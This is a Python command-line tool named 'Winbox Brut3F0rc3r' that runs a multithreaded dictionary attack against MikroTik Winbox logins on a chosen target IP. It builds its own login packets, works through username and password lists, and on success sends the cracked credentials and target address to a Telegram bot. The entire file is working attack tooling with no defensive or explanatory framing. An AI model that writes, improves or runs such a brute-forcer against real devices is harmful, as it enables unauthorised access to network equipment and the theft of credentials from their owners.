import socket
import struct
import sys
import argparse
import threading
import signal
import requests
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

stop_flag = False
lock = threading.Lock()

TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

total_combos = 0
combos_tried = 0
progress_lock = threading.Lock()

def banner():
    print(f"""{Colors.CYAN}
 ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
 ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
 ██║ █╗ ██║██║██╔██╗ ██║██████╔╝██║   ██║█████╔╝ █████╗  ██████╔╝
 ██║███╗██║██║██║╚██╗██║██╔═══╝ ██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║██║ ╚████║██║     ╚██████╔╝██║  ██╗███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
           {Colors.YELLOW}Winbox Brut3F0rc3r v1.0{Colors.RESET}
""")

def log(msg, lvl="info"):
    now = time.strftime("%H:%M:%S")
    color = Colors.GREEN if lvl == "success" else Colors.RED if lvl == "error" else Colors.YELLOW
    prefix = {"info": "[~]", "success": "[+]", "error": "[-]"}
    print(f"\n{color}{prefix.get(lvl,'[~]')} {now} | {msg}{Colors.RESET}")

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        log(f"Telegram send failed: {e}", "error")

def signal_handler(sig, frame):
    global stop_flag
    log("Ctrl+C detected. Halting threads...", "error")
    stop_flag = True

signal.signal(signal.SIGINT, signal_handler)

def winbox_encrypt(password):
    key = b"28353832"
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    padded = pad(password.encode(), AES.block_size)
    return cipher.encrypt(padded)

def build_tlv(t, v):
    return struct.pack('!BH', t, len(v)) + v

def build_login_packet(username, password):
    user_tlv = build_tlv(3, username.encode())
    pwd_tlv = build_tlv(4, winbox_encrypt(password))
    payload = user_tlv + pwd_tlv
    return struct.pack('!H', len(payload) + 2) + payload

def try_login(ip, port, username, password):
    global stop_flag
    if stop_flag:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.send(build_login_packet(username, password))
        resp = s.recv(1024)
        s.close()
        return b'\x01' in resp
    except:
        return False

def worker(ip, port, task_queue):
    global combos_tried, stop_flag
    spinner = ['|', '/', '-', '\\']
    spin_pos = 0

    while not stop_flag:
        try:
            username, password = task_queue.get_nowait()
        except:
            break

        with progress_lock:
            combos_tried += 1
        pct = (combos_tried / total_combos) * 100 if total_combos else 0
        bar_len = 30
        filled = int(pct / (100 / bar_len))
        bar = '=' * filled + '-' * (bar_len - filled)
        sys.stdout.write(
            f"\r{Colors.CYAN}[{bar}] {combos_tried}/{total_combos} "
            f"({pct:.1f}%) {spinner[spin_pos]} Trying {username}:{password or '<blank>'}     {Colors.RESET}"
        )
        sys.stdout.flush()
        spin_pos = (spin_pos + 1) % len(spinner)

        if try_login(ip, port, username, password):
            with lock:
                print(f"\n{Colors.GREEN}[+] SUCCESS: {username}:{password or '<blank>'}{Colors.RESET}")
                send_telegram_message(f"Winbox SUCCESS: {username}:{password or '<blank>'} @ {ip}")
                stop_flag = True
            break

        task_queue.task_done()

def main():
    global total_combos, stop_flag
    banner()

    parser = argparse.ArgumentParser(description="Winbox Brut3F0rc3r with style & Telegram alerts")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-P", "--port", type=int, default=8291, help="Target port")
    parser.add_argument("-u", "--user", help="Single username")
    parser.add_argument("-U", "--userlist", help="File with usernames")
    parser.add_argument("-p", "--passw", help="Single password")
    parser.add_argument("--dict", help="Password dictionary file")
    parser.add_argument("--blank", action="store_true", help="Include blank password")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Thread count")
    args = parser.parse_args()

    usernames = []
    if args.user:
        usernames.append(args.user)
    elif args.userlist:
        with open(args.userlist, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        log("You must specify -u or -U for usernames", "error")
        sys.exit(1)

    passwords = []
    if args.passw:
        passwords.append(args.passw)
    if args.dict:
        with open(args.dict, "r") as f:
            passwords += [line.strip() for line in f if line.strip()]
    if args.blank:
        passwords.append("")

    if not passwords:
        log("You must specify -p, --dict or --blank for passwords", "error")
        sys.exit(1)

    import queue
    task_queue = queue.Queue()
    for u in usernames:
        for p in passwords:
            task_queue.put((u, p))

    total_combos = task_queue.qsize()

    log(f"Launching attack on {args.target}:{args.port} with {args.threads} threads")
    log(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}, Total combos: {total_combos}")

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.target, args.port, task_queue))
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads):
            if stop_flag:
                break
            time.sleep(0.3)
    except KeyboardInterrupt:
        log("Keyboard interrupt received, stopping...", "error")
        stop_flag = True

    for t in threads:
        t.join()

    if stop_flag:
        log("Attack stopped or success found.", "success")
    else:
        log("Attack finished, no valid credentials found.", "error")

if __name__ == "__main__":
    main()
